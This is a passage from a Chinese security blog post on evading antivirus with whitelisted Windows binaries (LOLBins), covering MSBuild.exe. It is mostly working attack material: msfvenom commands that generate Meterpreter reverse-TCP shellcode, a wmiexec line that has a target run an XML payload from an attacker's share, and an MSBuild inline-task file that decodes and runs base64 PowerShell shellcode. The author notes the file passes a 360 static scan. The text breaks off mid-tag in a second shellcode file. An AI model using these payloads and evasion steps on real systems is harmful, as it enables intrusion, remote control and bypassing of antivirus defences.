<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="远控免杀——白名单篇前言白名单程序，白就是此文件在杀软的白名单中，不会被杀软查杀 黑就是恶意代码 通过白+黑的方式组成木马等，来达到免杀的目的">
<meta property="og:type" content="article">
<meta property="og:title" content="远控免杀——白名单篇">
<meta property="og:url" content="http://example.com/2022/02/23/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/index.html">
<meta property="og:site_name" content="Jasontt&#39;s Blog">
<meta property="og:description" content="远控免杀——白名单篇前言白名单程序，白就是此文件在杀软的白名单中，不会被杀软查杀 黑就是恶意代码 通过白+黑的方式组成木马等，来达到免杀的目的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222152728446.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222162020816.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222161956622.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222165327639.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222173052309.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222202231220.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222211320836.png">
<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223094748821.png">
<meta property="article:published_time" content="2022-02-23T06:18:04.000Z">
<meta property="article:modified_time" content="2022-02-23T07:17:56.446Z">
<meta property="article:author" content="Jason Tu">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222152728446.png">


<link rel="canonical" href="http://example.com/2022/02/23/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/23/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/","path":"2022/02/23/远控免杀——白名单篇/","title":"远控免杀——白名单篇"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>远控免杀——白名单篇 | Jasontt's Blog</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Jasontt's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87"><span class="nav-number">1.</span> <span class="nav-text">远控免杀——白名单篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LOLBins%E5%AE%9A%E4%B9%89"><span class="nav-number">1.1.1.</span> <span class="nav-text">LOLBins定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOLBins%E5%8A%9F%E8%83%BD"><span class="nav-number">1.1.2.</span> <span class="nav-text">LOLBins功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSBuild-exe"><span class="nav-number">1.2.</span> <span class="nav-text">MSBuild.exe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">加载文件方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%B8%80"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BA%8C"><span class="nav-number">1.2.3.</span> <span class="nav-text">利用二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misexec-exe"><span class="nav-number">1.3.</span> <span class="nav-text">misexec.exe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#InstallUtil-exe"><span class="nav-number">1.4.</span> <span class="nav-text">InstallUtil.exe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSC-InstallUtil%E6%89%A7%E8%A1%8Cshellcode"><span class="nav-number">1.4.1.</span> <span class="nav-text">CSC+InstallUtil执行shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mshta-exe"><span class="nav-number">1.5.</span> <span class="nav-text">Mshta.exe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CACTUSTORCH"><span class="nav-number">1.5.1.</span> <span class="nav-text">CACTUSTORCH</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rundll32-exe"><span class="nav-number">1.6.</span> <span class="nav-text">Rundll32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Regsvr32-exe"><span class="nav-number">1.7.</span> <span class="nav-text">Regsvr32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cmstp-exe"><span class="nav-number">1.8.</span> <span class="nav-text">Cmstp.exe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%9C%B0dll%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.1.</span> <span class="nav-text">执行本地dll文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Ccmd%E5%91%BD%E4%BB%A4"><span class="nav-number">1.8.2.</span> <span class="nav-text">执行cmd命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%B9%B6%E8%A7%A3%E6%9E%90%E8%BF%9C%E7%A8%8Binf%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.3.</span> <span class="nav-text">下载并解析远程inf文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP-exe"><span class="nav-number">1.9.</span> <span class="nav-text">FTP.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMIC"><span class="nav-number">1.10.</span> <span class="nav-text">WMIC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDpayload"><span class="nav-number">1.10.1.</span> <span class="nav-text">远程加载payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Regasm-exe-Regsvcs-exe"><span class="nav-number">1.11.</span> <span class="nav-text">Regasm.exe&#x2F;Regsvcs.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MavInject-exe"><span class="nav-number">1.12.</span> <span class="nav-text">MavInject.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forfiles-exe"><span class="nav-number">1.13.</span> <span class="nav-text">Forfiles.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pcalua-exe"><span class="nav-number">1.14.</span> <span class="nav-text">Pcalua.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#presentationhost-exe"><span class="nav-number">1.15.</span> <span class="nav-text">presentationhost.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SyncAppvPublishingServer-vbs"><span class="nav-number">1.16.</span> <span class="nav-text">SyncAppvPublishingServer.vbs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MavInject32-exe"><span class="nav-number">1.17.</span> <span class="nav-text">MavInject32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.18.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.19.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Jason Tu"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">Jason Tu</p>
  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">19</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">Jiang</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.cnblogs.com/yunqian2017" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017" rel="noopener" target="_blank">Openg</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E7%99%BD%E5%90%8D%E5%8D%95%E7%AF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="Jason Tu">
      <meta itemprop="description" content="一只谦虚的兔子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jasontt's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          远控免杀——白名单篇
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-02-23 14:18:04 / Modified: 15:17:56" itemprop="dateCreated datePublished" datetime="2022-02-23T14:18:04+08:00">2022-02-23</time>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="远控免杀——白名单篇"><a href="#远控免杀——白名单篇" class="headerlink" title="远控免杀——白名单篇"></a>远控免杀——白名单篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>白名单程序，白就是此文件在杀软的白名单中，不会被杀软查杀</p>
<p>黑就是恶意代码</p>
<p>通过白+黑的方式组成木马等，来达到免杀的目的</p>
<span id="more"></span>

<p>白名单程序的利用起源于LOLBins，全称<code>Living off the land Binaries</code>。Lolbins为二进制文件，攻击方可以通过该二进制文件执行超出其本身功能的工作</p>
<h3 id="LOLBins定义"><a href="#LOLBins定义" class="headerlink" title="LOLBins定义"></a>LOLBins定义</h3><ol>
<li><p>它是操作系统本身文件，或者是从Microsoft下载的文件。总之它必须带有windows自身签名文件。</p>
</li>
<li><p>由于是windows自身签名文件，所以一般天然带有免杀的属性,能通过很多应用程序的白名单。</p>
</li>
<li><p>它具有APT功能或者一些对红队有用的功能。比如2019年TA505利用LoLbin和新型后门攻击金融行业。</p>
</li>
</ol>
<h3 id="LOLBins功能"><a href="#LOLBins功能" class="headerlink" title="LOLBins功能"></a>LOLBins功能</h3><ol>
<li><p>执行代码：任意代码执行，通过LOLbins执行其他程序（未带微软签名）或者脚本。</p>
</li>
<li><p>代码编译</p>
</li>
<li><p>文件操作。下载；上传；复制</p>
</li>
<li><p>持久性权限维持。利用现有的LOLBins来做权限维持；持久性（比如通过隐藏数据在AD中，在登录时候启动。）</p>
</li>
<li><p>UAC Bypass</p>
</li>
<li><p>转储进程内存</p>
</li>
<li><p>监控（例如键盘记录器，网络跟踪等等）</p>
</li>
<li><p>逃避/修改日志</p>
</li>
<li><p>不需要重定位到文件系统其他位置的DLLinjected/side-loading。</p>
</li>
</ol>
<h2 id="MSBuild-exe"><a href="#MSBuild-exe" class="headerlink" title="MSBuild.exe"></a>MSBuild.exe</h2><p>在工具篇中用到的nps_payload就是生成<code>.xml</code>，然后利用msbuild.exe来加载payload</p>
<p>适用条件：.NET Framework&gt;=4.0</p>
<h3 id="加载文件方式"><a href="#加载文件方式" class="headerlink" title="加载文件方式"></a>加载文件方式</h3><ol>
<li><p>本地加载执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe &lt;folder_path_here&gt;\msbuild_nps.xml</span><br></pre></td></tr></table></figure></li>
<li><p>远程文件执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py &lt;USER&gt;:&#x27;&lt;PASS&gt;&#x27;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h3><p>msfvenom生成powershell shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 lport=4444 -f psh -o shell.ps1</span><br></pre></td></tr></table></figure>

<p>在ps1脚本末尾添加<code>for (;;)&#123;\n  Start-sleep 60\n&#125;</code></p>
<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222152728446.png" alt="image-20220222152728446"></p>
<p>用base64编码后放入<code>shell.xml</code>中<code>cmd</code>处</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- This inline task executes c# code. --&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe</span></span><br><span class="line"><span class="comment">nps.xml --&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- Original MSBuild Author: Casey Smith, Twitter: @subTee --&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- NPS Created By: Ben Ten, Twitter: @ben0xa --&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- License: BSD 3-Clause --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;npscsharp&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">nps</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">UsingTask</span></span></span><br><span class="line"><span class="tag"> <span class="attr">TaskName</span>=<span class="string">&quot;nps&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">TaskFactory</span>=<span class="string">&quot;CodeTaskFactory&quot;</span></span></span><br><span class="line"><span class="tag"> </span></span><br><span class="line"><span class="tag"><span class="attr">AssemblyFile</span>=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microso</span></span></span><br><span class="line"><span class="string"><span class="tag">ft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Task</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Reference</span> <span class="attr">Include</span>=<span class="string">&quot;System.Management.Automation&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Code</span> <span class="attr">Type</span>=<span class="string">&quot;Class&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;cs&quot;</span>&gt;</span></span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> using System;</span><br><span class="line"> using System.Collections.ObjectModel;</span><br><span class="line"> using System.Management.Automation;</span><br><span class="line"> using System.Management.Automation.Runspaces;</span><br><span class="line"> using Microsoft.Build.Framework;</span><br><span class="line"> using Microsoft.Build.Utilities;</span><br><span class="line"> public class nps : Task, ITask</span><br><span class="line"> &#123;</span><br><span class="line"> public override bool Execute()</span><br><span class="line"> &#123;</span><br><span class="line"> string cmd = &quot;JEFuRUl---base64_shellcode-----</span><br><span class="line">xsSW1wb3J0KCJrZXJuZWwzMi5k&quot;;</span><br><span class="line"> PowerShell ps = PowerShell.Create();</span><br><span class="line"> ps.AddScript(Base64Decode(cmd));</span><br><span class="line"> Collection&lt;PSObject&gt; output = null;</span><br><span class="line"> try</span><br><span class="line"> &#123;</span><br><span class="line"> output = ps.Invoke();</span><br><span class="line"> &#125;</span><br><span class="line"> catch(Exception e)</span><br><span class="line"> &#123;</span><br><span class="line"> Console.WriteLine(&quot;Error while executing the</span><br><span class="line">script.\r\n&quot; + e.Message.ToString());</span><br><span class="line"> &#125;</span><br><span class="line"> if (output != null)</span><br><span class="line"> &#123;</span><br><span class="line"> foreach (PSObject rtnItem in output)</span><br><span class="line"> &#123;</span><br><span class="line"> Console.WriteLine(rtnItem.ToString());</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return true;</span><br><span class="line"> &#125;</span><br><span class="line"> public static string Base64Encode(string text) &#123;</span><br><span class="line"> return</span><br><span class="line">System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(te</span><br><span class="line">xt));</span><br><span class="line"> &#125;</span><br><span class="line"> public static string Base64Decode(string encodedtext) &#123;</span><br><span class="line"> return</span><br><span class="line">System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String</span><br><span class="line">(encodedtext));</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ]]&gt;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">Code</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">UsingTask</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>脚本执行有点问题，<code>shell.xml</code>能过360静态查杀</p>
<h3 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h3><p>msfvenom生成C# shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 lport=4444 -f csharp</span><br></pre></td></tr></table></figure>

<p>shellcode.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- This inline task executes shellcode. --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Save This File And Execute The Above Command --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span> </span><br><span class="line">  <span class="comment">&lt;!-- License: BSD 3-Clause --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Target</span> <span 